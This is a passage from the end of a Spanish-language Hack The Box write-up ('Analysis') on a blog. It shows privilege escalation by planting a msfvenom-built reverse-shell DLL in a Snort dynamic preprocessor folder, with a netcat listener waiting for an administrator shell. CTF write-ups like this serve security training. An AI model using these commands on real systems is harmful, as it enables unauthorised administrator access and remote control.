<span class=line><span style=color:#79b8ff>05</span><span style=color:#f97583>/</span><span style=color:#79b8ff>24</span><span style=color:#f97583>/</span><span style=color:#79b8ff>2022</span><span style=color:#79b8ff>  06</span><span style=color:#e1e4e8>:</span><span style=color:#79b8ff>48</span><span style=color:#e1e4e8> AM            </span><span style=color:#79b8ff>78</span><span style=color:#f97583>,</span><span style=color:#79b8ff>336</span><span style=color:#e1e4e8> sf_engine.dll</span></span>
<span class=line><span style=color:#79b8ff>               1</span><span style=color:#e1e4e8> File(s)         </span><span style=color:#79b8ff>78</span><span style=color:#f97583>,</span><span style=color:#79b8ff>336</span><span style=color:#e1e4e8> bytes</span></span>
<span class=line><span style=color:#79b8ff>               2</span><span style=color:#e1e4e8> Dir(s)   </span><span style=color:#79b8ff>4</span><span style=color:#f97583>,</span><span style=color:#79b8ff>018</span><span style=color:#f97583>,</span><span style=color:#79b8ff>229</span><span style=color:#f97583>,</span><span style=color:#79b8ff>248</span><span style=color:#e1e4e8> bytes free</span></span>
<span class=line></span></code></pre><p>Para ello, creamos un archivo malicioso .dll con msfvenom:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>msfvenom</span><span style=color:#79b8ff> -p</span><span style=color:#9ecbff> windows/x64/shell_reverse_tcp</span><span style=color:#9ecbff> LHOST=tun0</span><span style=color:#9ecbff> LPORT=</span><span style=color:#79b8ff>9999</span><span style=color:#79b8ff> -f</span><span style=color:#9ecbff> dll</span><span style=color:#79b8ff> -a</span><span style=color:#9ecbff> x64</span><span style=color:#79b8ff> -o</span><span style=color:#9ecbff> nr.dll</span><span style=color:#e1e4e8>  </span></span>
<span class=line></span></code></pre><p>Nos ponemos en escucha:</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>rlwrap</span><span style=color:#79b8ff> -cAr</span><span style=color:#9ecbff> nc</span><span style=color:#79b8ff> -lvnp</span><span style=color:#79b8ff> 9999</span></span>
<span class=line></span></code></pre><p>luego vamos a la ruta <code>C:\Snort\lib\snort_dynamicpreprocessor</code> y dentro de ese directorio subimos nuestra dll maliciosa</p><pre class="astro-code github-dark" data-language=bash style=background-color:#24292e;color:#e1e4e8;overflow-x:auto tabindex=0><code><span class=line><span style=color:#b392f0>upload</span><span style=color:#9ecbff> nr.dll</span></span>
<span class=line></span></code></pre><p>En 1 minuto tendremos un shell como administrador.</p></div><div class="transition overflow-hidden bg-[var(--license-block-bg)] license-container mb-6 onload-animation px-6 py-5 relative rounded-xl"><div class="transition font-bold dark:text-white/75 text-black/75">Analysis HTB Writeup</div><a href=https://mil4ne.pages.dev/ class="text-[var(--primary)] link">https://mil4ne.pages.dev/</a><div class="flex gap-6 mt-2"><div><div class="transition text-sm dark:text-white/30 text-black/30">Autor</div><div class="transition whitespace-nowrap dark:text-white/75 text-black/75">Mil4ne</div></div><div><div class="transition text-sm dark:text-white/30 text-black/30">Publicando el</div><div class="transition whitespace-nowrap dark:text-white/75 text-black/75">2024-06-21</div></div><div><div class="transition text-sm dark:text-white/30 text-black/30">Licencia</div><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ class="text-[var(--primary)] link whitespace-nowrap" target=_blank>CC BY-NC-SA 4.0</a></div></div><svg data-icon=fa6-brands:creative-commons height=1em viewBox="0 0 496 512" width=0.97em class="transition absolute pointer-events-none -translate-y-1/2 dark:text-white/5 right-6 text-[15rem] text-black/5 top-1/2"><symbol id=ai:fa6-brands:creative-commons><path d="m245.83 214.87l-33.22 17.28c-9.43-19.58-25.24-19.93-27.46-19.93c-22.13 0-33.22 14.61-33.22 43.84c0 23.57 9.21 43.84 33.22 43.84c14.47 0 24.65-7.09 30.57-21.26l30.55 15.5c-6.17 11.51-25.69 38.98-65.1 38.98c-22.6 0-73.96-10.32-73.96-77.05c0-58.69 43-77.06 72.63-77.06c30.72-.01 52.7 11.95 65.99 35.86m143.05 0l-32.78 17.28c-9.5-19.77-25.72-19.93-27.9-19.93c-22.14 0-33.22 14.61-33.22 43.84c0 23.55 9.23 43.84 33.22 43.84c14.45 0 24.65-7.09 30.54-21.26l31 15.5c-2.1 3.75-21.39 38.98-65.09 38.98c-22.69 0-73.96-9.87-73.96-77.05c0-58.67 42.97-77.06 72.63-77.06c30.71-.01 52.58 11.95 65.56 35.86M247.56 8.05C104.74 8.05 0 123.11 0 256.05c0 138.49 113.6 248 247.56 248c129.93 0 248.44-100.87 248.44-248c0-137.87-106.62-248-248.44-248m.87 450.81c-112.54 0-203.7-93.04-203.7-202.81c0-105.42 85.43-203.27 203.72-203.27c112.53 0 202.82 89.46 202.82 203.26c-.01 121.69-99.68 202.82-202.84 202.82" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:creative-commons></use></svg></div></div></div><div class="flex w-full gap-4 flex-col mb-4 justify-between md:flex-row overflow-hidden"><a href=/posts/lame/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full justify-start btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl"><svg data-icon=material-symbols:chevron-left-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-left-rounded><path d="m10.8 12l3.9 3.9q.275.275.275.7t-.275.7t-.7.275t-.7-.275l-4.6-4.6q-.15-.15-.212-.325T8.425 12t.063-.375t.212-.325l4.6-4.6q.275-.275.7-.275t.7.275t.275.7t-.275.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-left-rounded></use></svg><div class="transition whitespace-nowrap dark:text-white/75 text-black/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden">Lame HTB Writeup</div></div></a><a href=/posts/builder/ class="w-full active:scale-95 font-bold overflow-hidden"><div class="flex items-center w-full btn-card gap-4 h-[3.75rem] max-w-full px-4 rounded-2xl justify-end"><div class="transition whitespace-nowrap dark:text-white/75 text-black/75 max-w-[calc(100%_-_3rem)] overflow-ellipsis overflow-hidden">Builder HTB Writeup</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[var(--primary)] text-[2rem]"><symbol id=ai:material-symbols:chevron-right-rounded><path d="M12.6 12L8.7 8.1q-.275-.275-.275-.7t.275-.7t.7-.275t.7.275l4.6 4.6q.15.15.213.325t.062.375t-.062.375t-.213.325l-4.6 4.6q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></div></a></div></main></div><div class="onload-animation col-span-2 grid-rows-3 mt-4" id=footer><div class="flex items-center card-base max-w-[var(--page-width)] mx-auto min-h-[4.5rem] px-6 rounded-b-none"><div class="transition text-sm text-50"> 2024 Mil4ne. Todos los Derechos Reservados.<br>Desarrollado por <a href=https://github.com/mil4ne class="text-[var(--primary)] link font-medium" target=_blank>Mil4ne</a></div></div></div><div class="back-to-top-wrapper hidden lg:block" data-astro-cid-eymb5ayk><div class="transition flex items-center back-to-top-btn hide overflow-hidden rounded-2xl" id=back-to-top-btn data-astro-cid-eymb5ayk onclick=backToTop()><button class="w-[3.75rem] btn-card h-[3.75rem]" aria-label="Back to Top" data-astro-cid-eymb5ayk><svg data-icon=material-symbols:keyboard-arrow-up-rounded height=1em viewBox="0 0 24 24" width=1em class=mx-auto data-astro-cid-eymb5ayk><symbol id=ai:material-symbols:keyboard-arrow-up-rounded><path d="m12 10.8l-3.9 3.9q-.275.275-.7.275t-.7-.275t-.275-.7t.275-.7l4.6-4.6q.3-.3.7-.3t.7.3l4.6 4.6q.275.275.275.7t-.275.7t-.7.275t-.7-.275z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:keyboard-arrow-up-rounded></use></svg></button></div></div><script>function backToTop(){window.scroll({top:0,behavior:"smooth"})}function scrollFunction(){let o=document.getElementById("back-to-top-btn");document.body.scrollTop>600||document.documentElement.scrollTop>600?o.classList.remove("hide"):o.classList.add("hide")}window.onscroll=scrollFunction</script></div></div></body></html>